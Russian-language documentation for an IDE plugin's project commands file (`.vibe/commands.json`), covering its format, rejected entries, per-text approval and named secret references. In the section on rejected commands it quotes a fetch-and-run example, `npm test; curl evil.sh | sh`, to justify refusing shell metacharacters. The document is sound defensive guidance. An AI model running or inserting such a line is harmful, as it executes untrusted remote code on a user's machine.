# `.vibe/commands.json` — команды проекта

Файл едет в репозитории: коллега, склонировавший проект, получает те же «поднять окружение» и
«прогнать гейты», ничего не спрашивая. Вызов — «VibeIDEA: команды проекта» в меню Tools.

Скопируйте этот документ целиком своей модели и попросите собрать `.vibe/commands.json` для вашего
проекта — он самодостаточен.

## Формат

```json
{
  "commands": [
    { "id": "gates",  "title": "Прогнать гейты", "command": "./vibe-plugins/tools/checkVibeUi.sh", "order": 1, "pinned": true },
    { "id": "deploy", "title": "Выкатить",       "command": "./deploy.sh --token ${secret:GH_TOKEN}", "order": 2, "color": "red" }
  ]
}
```

Принимается и голый массив без обёртки `commands`.

| Поле | Обязательно | Смысл |
|---|---|---|
| `id` | да | уникальный внутри файла; по нему запоминается разрешение |
| `command` | да | ровно одна команда, без метасимволов оболочки |
| `title` | нет | подпись в списке; без него показывается `id` |
| `order` | нет | позиция в списке; при равенстве — порядок в файле |
| `pinned` | нет | признак «часто нужная» (закреплённые идут в отдельное меню) |
| `color` | нет | имя цвета для UI; незнакомое значение игнорируется |

Максимум 50 команд.

## Что отклоняется и почему

Файл — это код, который кто-то другой мог написать, а исполняется он на вашей машине.

- **Метасимволы оболочки** `;` `&` `|` `` ` `` `$` и переводы строк — команда отклоняется **целиком**,
  а не экранируется. Строка вида `npm test; curl evil.sh | sh` — либо атака, либо ошибка, и гадать,
  какая именно, не наше дело.
- **Невидимые символы** (нулевой ширины, мягкий перенос) — по той же причине: команда, которая на
  экране выглядит не тем, чем является, не запускается.
- **Дубль `id`** — остаётся первая запись; вторую молча подменить значило бы сделать поведение
  зависящим от порядка строк в чужом пулл-реквесте.

Отклонённые записи называются в диалоге, а не пропадают: тихо потерянная команда выглядит как
«не работает IDE».

## Разрешение

Первый запуск команды спрашивает подтверждение и показывает её текст. Разрешение запоминается для
**этого текста**: любая правка команды — человеком или пулл-реквестом — отзывает его автоматически,
и следующий запуск спросит снова.

## Секреты

Значения секретов в файле не пишутся никогда. Ссылка по имени:

```
"command": "./deploy.sh --token ${secret:GH_TOKEN}"
```

Значение берётся при запуске из `.vibe/.env` проекта, а если там нет — из переменных окружения.
В журнал аудита и в ленту уходит ссылка, а не значение.

Секрет не найден — команда **не** запускается, а IDE называет недостающие имена: пустая подстановка
превратила бы команду в запрос, падающий непонятно почему.
